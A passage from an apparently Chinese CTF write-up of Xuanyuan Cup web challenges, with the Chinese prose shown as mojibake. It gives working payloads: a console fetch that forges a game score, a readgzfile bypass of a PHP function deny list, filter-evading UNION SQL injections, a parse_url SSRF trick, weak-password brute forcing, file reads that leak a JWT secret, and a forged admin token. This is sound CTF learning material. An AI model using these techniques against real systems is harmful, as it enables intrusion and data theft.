class="hljs-params">error</span> =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;é”™è¯¯:&#x27;</span>, error);<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ»¡è¶³åˆ†æ•°è¾¾åˆ°100000000000ï¼Œå°±ä¼šå‘<code>getflag.php</code>å‘é€POSTè¯·æ±‚è·å–flagï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°è¾“å…¥<code>if</code>å‡½æ•°ä¸­è¯·æ±‚çš„ä»£ç ï¼Œå°†å…¶ä¸­çš„<code>scoreNow</code>æ›¿æ¢æˆ100000000000ï¼Œå³å¯è·å–flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;getflag.php&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;score=&#x27;</span> + <span class="hljs-number">100000000000</span><br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æ­å–œä½ ï¼flagæ˜¯ï¼š&quot;</span> + data);<br>&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522133239388.png" alt="image-20250522133239388"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨bpæŠ“åŒ…å‘é€POSTè¯·æ±‚</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522133525528.png" alt="image-20250522133525528"></p><h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>, <br>        <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>, <br>        <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>, <br>        <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>, <br>        <span class="hljs-string">&quot;register_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>, <br>        <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <br>        <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>, <br>        <span class="hljs-string">&quot;file_put_contents&quot;</span>, <span class="hljs-string">&quot;readfile&quot;</span>, <span class="hljs-string">&quot;file_get_contents&quot;</span>, <span class="hljs-string">&quot;highlight_file&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span><br>    );<br>    <br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disable_fun</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å®å®è¿™å¯¹å˜›,è¿™ä¸å¯¹å™¢&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$star</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> != <span class="hljs-number">1234</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹æ¥ç¬¬ä¸€å±‚å¯¹ä½ æ¥è¯´æ˜¯å°case&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">1234</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿˜æ˜¯æœ‰ç‚¹å®åŠ›çš„å˜›&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$new</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$star</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹èµ·æ¥ä½ é‡åˆ°éš¾å…³äº†å“ˆå“ˆ&lt;br&gt;&quot;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$new</span>); <br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>) &#123; <br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$star</span>); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ­å–œä½ ï¼Œåˆæˆé•¿äº†&lt;br&gt;&quot;</span>;<br>            &#125; <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>GETä¼ å‚<code>num</code>ï¼Œè¦æ±‚ä¸ºæ•°å­—å¹¶ä¸”å¤§äº1234ï¼Œç›´æ¥1235</p><p>POSTä¼ å‚<code>new</code>å’Œ<code>star</code>ï¼Œå…¶ä¸­<code>new</code>çš„å†…å®¹ä¼šç»è¿‡<code>waf</code>å‡½æ•°çš„æ£€æŸ¥ï¼Œæœ€åè¿™ä¸¤ä¸ªå‚æ•°ä¼šå½“ä½œå‚æ•°ä¼ ç»™<code>call_user_func()</code>å‡½æ•°ï¼Œä¸”æœ¬å‡½æ•°æ— å›æ˜¾</p><p>çœ‹å¤§ä½¬çš„WPæ‰çŸ¥é“<code>readgzfile</code>è¿™ä¸ªå‡½æ•°ï¼Œé•¿è§è¯†äº†</p><p><code>new</code>ä¸º<code>readgzfile</code>ï¼Œ<code>star</code>ä¸ºè¯»å–çš„æ–‡ä»¶è·¯å¾„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=1235<br><br><span class="hljs-attribute">new</span>=readgzfile&amp;star=/flag<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522144831744.png" alt="image-20250522144831744"></p><h1 id="ezsql1-0"><a href="#ezsql1-0" class="headerlink" title="ezsql1.0"></a>ezsql1.0</h1><p>SQLæ³¨å…¥ï¼Œç”¨bpçˆ†å‡ºä»¥ä¸‹waf</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522152527669.png" alt="image-20250522152527669"></p><p>ç©ºæ ¼è¿‡æ»¤å¯ä»¥ä½¿ç”¨<code>/**/</code>ç»•è¿‡ï¼Œå­—ç¬¦ä¸²è¿‡æ»¤å¯ä»¥è¿›è¡ŒåŒå†™ç»•è¿‡ï¼Œè¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥</p><p>å¸¸è§„çš„è”åˆæ³¨å…¥</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>seselectlect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522153013036.png" alt="image-20250522153013036"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522153135337.png" alt="image-20250522153135337"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522153507672.png" alt="image-20250522153507672"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,data)<span class="hljs-comment">/**/</span><span class="hljs-built_in">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522153707846.png" alt="image-20250522153707846"></p><p>ä¸è¿‡è¿™æ˜¯ä¸ªå‡çš„flagï¼Œflagä¸åœ¨å½“å‰æ•°æ®åº“ï¼Œå°±å»çœ‹çœ‹å…¶ä»–æ•°æ®åº“</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name)<span class="hljs-comment">/**/</span><span class="hljs-built_in">from</span><span class="hljs-comment">/**/</span>information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522153900673.png" alt="image-20250522153900673"></p><p>å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ª<code>xuanyuanCTF</code>æ•°æ®åº“ï¼Œé‡æ–°å†æ¥ä¸€éè”åˆæ³¨å…¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&#x27;xuanyuanCTF&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522154418474.png" alt="image-20250522154418474"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-built_in">from</span><span class="hljs-comment">/**/</span>xuanyuanCTF.info<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522154547413.png" alt="image-20250522154547413"></p><p>æœ€åä¸€ä¸ªbase64è§£ç å³å¯</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522154614534.png" alt="image-20250522154614534"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;æ¬¢è¿æ¥åˆ°è½©è¾•æ¯&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ezssrf1-0"><a href="#ezssrf1-0" class="headerlink" title="ezssrf1.0"></a>ezssrf1.0</h1><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span> == <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try to add ?url=xxxx.&quot;</span>);<br><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$x</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;(;_;)&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>] === <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>] === <span class="hljs-string">&#x27;http&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;Well, Going to &#x27;</span> . <span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(^-ï¼¿-^)&quot;</span>;<br></code></pre></td></tr></table></figure><p>GETä¼ å‚<code>url</code>ï¼Œè¦æ±‚æ»¡è¶³<code>host</code>ä¸º<code>null</code>ï¼Œ<code>scheme</code>ä¸º<code>http</code>ï¼Œå°±æ˜¯åªèƒ½ä½¿ç”¨<code>http</code>åè®®è¯·æ±‚ï¼Œæ˜æ˜¾çš„SSRF</p><p>å› ä¸ºè¦æ»¡è¶³<code>host</code>ä¸º<code>null</code>ï¼Œæ‰€ä»¥æ­£å¸¸çš„è®¿é—®æ˜¯ä¸å¯ä»¥çš„</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>rl=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522160121255.png" alt="image-20250522160121255"></p><p>æ³¨æ„ä»£ç ä¸­ä½¿ç”¨<code>parse_url</code>å‡½æ•°å¯¹è¾“å…¥çš„IPï¼ˆå¦‚ï¼š<a href="http://127.0.0.1)è¿›è¡Œè§£æ,ä¼šå°†`host`è§£æä¸º`127.0.0.1`,`scheme`ä¸º`http`/">http://127.0.0.1ï¼‰è¿›è¡Œè§£æï¼Œä¼šå°†`host`è§£æä¸º`127.0.0.1`ï¼Œ`scheme`ä¸º`http`</a></p><p>å½“åªä½¿ç”¨ä¸€ä¸ªæ–œçº¿<code>/</code>æ—¶ï¼Œç”±äºç¼ºå°‘ <code>//</code>ï¼Œ<code>parse_url()</code> ä¼šå°†æ•´ä¸ªè·¯å¾„è§†ä¸º <code>path</code>ï¼Œè€Œé <code>host</code>ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ä»¥ä¸‹paylaod</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=http:/127.0.0.1/flag<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522160201137.png" alt="image-20250522160201137"></p><p>å¾—åˆ°æç¤ºflagåœ¨<code>FFFFF11111AAAAAggggg.php</code>æ–‡ä»¶ä¸­</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=http:/127.0.0.1/FFFFF11111AAAAAggggg.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522160254887.png" alt="image-20250522160254887"></p><p>è¿˜æœ‰ä¸ªéé¢„æœŸå§ï¼Œç›´æ¥ç”¨<code>dirsearch</code>æ‰«æç›®å½•å¯ä»¥æ‰«å‡º<code>/flag</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747745573613-87a4eea4-683d-4493-9521-c34e917da24c.webp" alt="å›¾ç‰‡.png"></p><p>ç„¶åå†æµè§ˆå™¨é‡Œç›´æ¥è®¿é—®è¿™ä¸ªè·¯ç”±ä¼šä¸‹è½½å¾—åˆ°<code>flag</code>æ–‡ä»¶</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747745616423-cd5e22c6-1df0-4dd9-847e-a0c16b6c5ea9.webp" alt="å›¾ç‰‡.png"></p><p>è®¿é—®<code>/FFFFF11111AAAAAggggg.php</code>è·å¾—flag</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747745661246-445d786a-c6f6-4ed5-8333-cfb99a30e380.webp" alt="å›¾ç‰‡.png"></p><h1 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h1><p>å…ˆçœ‹æºç ï¼Œä¼šå¾—åˆ°ä¸ª<code>fly233</code>ç”¨æˆ·</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161256728.png" alt="image-20250522161256728"></p><p>ç”¨bpè¿›è¡Œå¼±å¯†ç çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç æ˜¯<code>123456789</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161417248.png" alt="image-20250522161417248"></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161435901.png" alt="image-20250522161435901"></p><p>ç„¶åä¼šæ¥åˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161515188.png" alt="image-20250522161515188"></p><p>è®¿é—®ä¸Šé¢ä¸‰ä¸ªä¼šè¿›å…¥<code>/read</code>è·¯ç”±ï¼Œä¼šå¾—åˆ°ä¸‹é¢è¿™äº›ï¼Œæ˜¯æç¤ºJWTï¼Œæ¡ä»¶ç«äº‰</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161856199.png" alt="image-20250522161856199"></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161908486.png" alt="image-20250522161908486"></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161918496.png" alt="image-20250522161918496"></p><p>å¹¶ä¸”å­˜åœ¨POSTå‚æ•°<code>book_path</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161602746.png" alt="image-20250522161602746"></p><p>æµ‹è¯•åå‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522161655918.png" alt="image-20250522161655918"></p><p>è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ å›¾ä¹¦çš„æŒ‰é’®ï¼Œè®¿é—®æ˜¯ä¸Šä¼ æ–‡ä»¶</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162304100.png" alt="image-20250522162304100"></p><p>ä¸è¿‡éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè¿™é‡Œçš„<code>cookie</code>é‡Œæ˜¯JWT</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162427166.png" alt="image-20250522162427166"></p><p>æ ¹æ®æ–‡ä»¶å†…å®¹ï¼Œæƒ³åˆ°åˆ©ç”¨<code>JWT</code>ä¼ªé€ æˆ<code>admin</code>ï¼Œå¯†é’¥å¯ä»¥é€šè¿‡è¯»å–ç¯å¢ƒå˜é‡è·å–</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162125319.png" alt="image-20250522162125319"></p><p>å¾—åˆ°<code>key</code>ä¸º<code>th1s_1s_k3y</code>ï¼Œåœ¨çº¿ç½‘ç«™è§£åˆšæ‰ä¸Šä¼ æ–‡ä»¶æ—¶å€™çš„<code>cookie</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162816790.png" alt="image-20250522162816790"></p><p>åˆ©ç”¨<code>key</code>è¿›è¡Œæ„é€ </p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162859433.png" alt="image-20250522162859433"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIn<span class="hljs-number">0</span>.EYrwzSGzfGe_PMnw-Wl<span class="hljs-number">4</span>Ymt_QuMtyApHi<span class="hljs-number">57</span>DMcZ<span 